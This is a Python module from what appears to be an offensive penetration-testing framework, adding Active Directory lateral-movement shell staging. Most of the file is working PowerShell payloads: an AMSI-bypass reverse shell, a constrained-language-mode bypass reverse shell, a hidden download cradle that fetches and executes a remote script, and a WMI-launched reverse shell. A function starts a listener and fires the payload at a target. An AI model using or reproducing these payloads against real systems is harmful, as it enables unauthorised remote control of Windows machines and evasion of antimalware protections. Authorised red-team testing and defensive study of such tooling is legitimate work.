"""AD-specific shell staging mixin for lateral movement modules.

Extends xpl-core ShellStagingMixin with Windows/AD-centric payloads
and integrates with ADCredential for authenticated shell spawning.

Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""


import threading
import time
from typing import Any, Optional

from xpl_core.shells import (
    SessionManager,
    ReverseListener,
    generate_payload,
    pty_interact,
)

_session_mgr = SessionManager()

AD_SHELL_TYPES = (
    "powershell",
    "powershell_b64",
    "cmd_nc",
    "meterpreter_windows",
    "meterpreter_windows_x64",
    "ps_amsi_bypass",
    "ps_clm_bypass",
    "ps_download_cradle",
    "wmi_process_shell",
)


def _ad_payload(shell_type: str, lhost: str, lport: int) -> str:
    """Generate AD/Windows-specific payloads beyond the xpl-core catalog."""
    t = shell_type.lower().strip()

    if t == "ps_amsi_bypass":
        return (
            "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \""
            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
            ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
            f"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
            "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
            "while(($i=$s.Read($b,0,$b.Length))-ne 0){"
            "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            "$r=(iex $d 2>&1|Out-String);"
            "$r2=$r+'PS '+(pwd).Path+'> ';"
            "$e=([text.encoding]::ASCII).GetBytes($r2);"
            "$s.Write($e,0,$e.Length)}$c.Close()\""
        )

    if t == "ps_clm_bypass":
        return (
            "powershell -NoP -Exec Bypass -Command \""
            "$e=[System.Text.Encoding]::ASCII;"
            f"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
            "$s=$c.GetStream();"
            "while($c.Connected){"
            "[byte[]]$b=0..65535|%{0};"
            "$i=$s.Read($b,0,$b.Length);"
            "if($i -eq 0){break};"
            "$d=$e.GetString($b,0,$i);"
            "try{$r=(Invoke-Expression $d 2>&1|Out-String)}catch{$r=$_.Exception.Message};"
            "$r2=$r+'PS '+(pwd).Path+'> ';"
            "$sb=$e.GetBytes($r2);$s.Write($sb,0,$sb.Length)}$c.Close()\""
        )

    if t == "ps_download_cradle":
        return (
            "powershell -NoP -W Hidden -Exec Bypass -Command \""
            "IEX(New-Object Net.WebClient).DownloadString("
            f"'http://{lhost}:{lport}/shell.ps1')\""
        )

    if t == "wmi_process_shell":
        return (
            "cmd.exe /c powershell -NoP -W Hidden -Exec Bypass -Command \""
            f"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
            "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
            "while(($i=$s.Read($b,0,$b.Length))-ne 0){"
            "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            "$r=(iex $d 2>&1|Out-String);"
            "$r2=$r+'PS '+(pwd).Path+'> ';"
            "$e=([text.encoding]::ASCII).GetBytes($r2);"
            "$s.Write($e,0,$e.Length)}$c.Close()\""
        )

    return generate_payload(t, lhost, lport)


def get_session_manager() -> SessionManager:
    """Return the global AD session manager singleton."""
    return _session_mgr


def spawn_ad_shell(
    target: str,
    lhost: str,
    lport: int = 4444,
    shell_type: str = "powershell",
    execute_fn: Any | None = None,
    timeout: int = 60,
) -> bool:
    """Spawn a reverse shell from an AD lateral movement action.

    If execute_fn is provided, it is called in a background thread with
    the generated payload while the listener waits for the connection.
    """
    payload = _ad_payload(shell_type, lhost, lport)
    if not payload:
        print(f"[-] [ad-shell] Unknown shell type: '{shell_type}'")
        return False

    print(f"[*] [ad-shell] Payload type: {shell_type}")
    print(f"[*] [ad-shell] Listener: {lhost}:{lport}")

    with ReverseListener(lhost, lport, timeout, pty_upgrade=True) as ln:
        if execute_fn is not None:
            def _exec() -> None:
                time.sleep(1)
                try:
                    execute_fn(payload)
                except Exception as exc:
                    print(f"[-] [ad-shell] Execute: {exc}")

            t = threading.Thread(target=_exec, daemon=True)
            t.start()

        return ln.wait_for_connection()
